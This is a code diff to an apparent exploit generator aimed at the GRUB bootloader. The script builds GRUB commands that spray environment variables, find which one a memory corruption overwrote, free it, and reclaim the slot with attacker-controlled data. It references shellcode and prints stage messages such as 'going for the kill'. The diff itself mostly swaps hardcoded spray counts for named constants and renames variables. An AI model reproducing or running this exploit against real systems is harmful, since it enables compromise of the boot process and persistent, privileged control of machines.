@@ -1,6 +1,7 @@
 from gpt import stack
 from consts import BANNER, PROBE_DEPTH, MAX_DEPTH, BLOCK_SIZE, SHELLCODE, \
-        TRASH_ALLOC
+        TRASH_ALLOC, START_DEPTH, END_DEPTH, FUN_COUNT, SPRAY_ENVVAR, \
+        SPRAY_CONSTRUCTION
 from util import command, find_root, grub_print, force_regions_to_exist, \
         env_block, VarSplit, RecursiveFuncs, while_loop, grub_env_var, \
         grub_mm_header_t, hashval, Variable
@@ -107,7 +108,6 @@ def clashgpt(basepath):
     control_b += fakeenv
     control_b += b'\x00' * (32 - (len(control_b) % 32))
 
-    print(len(control_b), len(probe_b))
     assert len(control_b) == len(probe_b)
 
     probe = Primitive('base', probe_b)
@@ -138,14 +138,14 @@ def clashgpt(basepath):
     trigger += force_regions_to_exist()
     trigger += grub_print('[!] Setting up construction')
     # setup the construction
-    for i in range(64):
-        trigger += vs.define(f'uwu_{i}')
+    for i in range(SPRAY_CONSTRUCTION):
+        trigger += vs.define(f'con_{i}')
 
     trigger += probe.trigger(PROBE_DEPTH)
     # now determine which one we corrupted.
-    for i in range(64):
+    for i in range(SPRAY_CONSTRUCTION):
         trigger += command(
-            f'if [ ${{uwu_{i}}} != ${{t_0}} ] ; then set end=uwu_{i}; fi'
+            f'if [ ${{con_{i}}} != ${{t_0}} ] ; then set end=con_{i}; fi'
         )
 
     trigger += grub_print('[!] Corrupting: ${end}')
@@ -157,8 +157,8 @@ def clashgpt(basepath):
     # so then we can free it and get an object we fully control here.
     # wrapping this in a while loop so we can break from it early.
     internal = []
-    for depth in range(PROBE_DEPTH, PROBE_DEPTH+10):
-        for fun in range(16):
+    for depth in range(START_DEPTH, END_DEPTH):
+        for fun in range(FUN_COUNT):
             internal += command(f'set depth_={probe.map_depth(depth)}')
             internal += command(f'set fun={fun:04}')
             internal += probe.trigger(depth, fun)
@@ -179,7 +179,7 @@ def clashgpt(basepath):
     internal += grub_print('[!] going for the kill')
     internal += command('unset ${end}')
     # spray grub_env_vars to get one in our free slot
-    for i in range(1024):
+    for i in range(SPRAY_ENVVAR):
         internal += Variable(f'spray_{i}', target=0).set('${template}'*64)
     # now we use our controlled overwrite....
     internal += control.trigger('${depth_}', 'fun')
